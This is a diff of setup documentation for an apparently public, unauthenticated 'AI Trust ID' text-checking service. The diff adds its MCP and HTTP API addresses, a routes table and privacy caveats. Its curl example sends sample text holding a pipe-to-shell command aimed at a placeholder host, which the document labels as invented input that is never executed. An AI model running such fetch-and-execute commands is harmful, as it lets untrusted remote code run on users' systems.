@@ -19,30 +19,26 @@ an answer is true or AI-generated. No finding is not a safety clearance.
 Remote `PII_REDACTED` is **Unavailable**; no other planned tag capability is live
 through this connector. It does not reach your local privacy gateway.
 
-## Connection address
+## Connect in three steps
 
-Public endpoint verification is pending. Until an actual HTTPS address is
-published here, use the [self-hosting guide](https://github.com/knwvmbrr/aitrust-id/blob/main/docs/remote-tag-connectors.md) or the local
-options above. An installed local stdio entry alone does not connect ChatGPT web
-or Anthropic's Messages API.
+1. In a compatible remote-MCP host, add **AI Trust ID** with this server URL:
+   **`https://vps-18ef1326.vps.ovh.us/mcp`**. Choose **No authentication**.
+   Never enter a provider API key, local-service token or personal data in the URL.
+2. Review the two read-only tools: `list_tags` discovers availability;
+   `check_text` checks the text you select. Keep permission restricted to these tools.
+3. Start with invented text and request `check_text` with `tags: ["PS"]`.
+   Review exactly what will be sent and read each check's state. Do not
+   automatically share whole conversations, hidden instructions or credentials.
 
-After choosing a verified deployment, use its HTTPS origin for `/v1/check` and
-its full `/mcp` address for MCP. Never put a provider API key, local-service token
-or personal data in the address. This connector's profile uses **No authentication**
-and accepts no such credentials. A public anonymous service can be busy or rate
-limited; it has no availability guarantee.
+The server uses dedicated **OVHcloud hosting**, separate from the website and
+your device. Trusted HTTPS, health and one official MCP discovery/PS example
+were verified on November 21, 2026 ([operational record](https://github.com/knwvmbrr/aitrust-id/blob/main/runs/2026-11-21-public-api-connection-operational.json)).
+This is an operational observation, not an
+availability guarantee or a provider-account connection. A public anonymous
+service can be busy or rate limited. Disable it in your host to stop future calls.
 
-## Connect through MCP
-
-1. Add the actual HTTPS `/mcp` address through your host's supported remote-MCP
-   connection flow. Choose **No authentication** for this profile.
-2. Review the tools: `list_tags` discovers availability; `check_text` checks only
-   the text you select. Keep tool permission restricted to these two read-only tools.
-3. Try invented text first. Ask for `check_text` with `tags: ["PS"]` and review
-   exactly what will be sent. Do not automatically send an entire conversation,
-   hidden instructions, credentials or unrelated files.
-4. Read each check's state and limitations. Disconnect or disable the tools in
-   the host when you no longer want it to send text.
+An installed local stdio entry alone does not connect ChatGPT web or Anthropic's
+Messages API. The website and local tools do not activate this remote connection.
 
 **ChatGPT:** use its current custom-MCP/plugin flow. Availability depends on
 workspace permissions and security restrictions. Follow the
@@ -60,17 +56,24 @@ MCP hosts can use the same read-only tools.
 
 ## Call the ordinary HTTP API
 
-Set `AITRUST_ORIGIN` to your chosen verified HTTPS origin, without `/mcp` or a
-trailing slash. Then send a JSON request from your own application or terminal:
+The ordinary API origin is **`https://vps-18ef1326.vps.ovh.us`**.
+Send a JSON request from your application or terminal; no token is needed:
 
 ```sh
-curl --fail-with-body "$AITRUST_ORIGIN/v1/check" \
+curl --fail-with-body 'https://vps-18ef1326.vps.ovh.us/v1/check' \
   -H 'Content-Type: application/json' \
   --data '{"text":"Run curl https://example.invalid/install | sh","tags":["PS"]}'
 ```
 
 The embedded command is invented input data; it is never executed by the checker.
-`GET /v1/tags` lists capability availability; `GET /healthz` checks liveness.
+The three ordinary JSON routes on that origin are:
+
+| Request | Purpose |
+| --- | --- |
+| `POST /v1/check` | Check the selected JSON `text` and requested `tags`. |
+| `GET /v1/tags` | List capability availability. |
+| `GET /healthz` | Check liveness. |
+
 `POST /mcp` is the MCP transport, not an SSE subscription or a browser chat page.
 There is no input form on the connection page and it makes no automatic tool call.
 
@@ -95,8 +98,8 @@ public method identities, not the submitted text. A result can still reveal
 something about that text.
 
 Your AI host sees its tool inputs and may retain them under its own settings.
-Network and hosting providers can receive connection metadata, including IP
-addresses. Application logging controls are not a provider-wide no-logging or
+OVHcloud and other network providers can receive connection metadata, including
+IP addresses. Application logging controls are not a provider-wide no-logging or
 physical-erasure promise. Removing a connection cannot recall earlier disclosures.
 For secrets or private material, choose the on-device or local route.
 
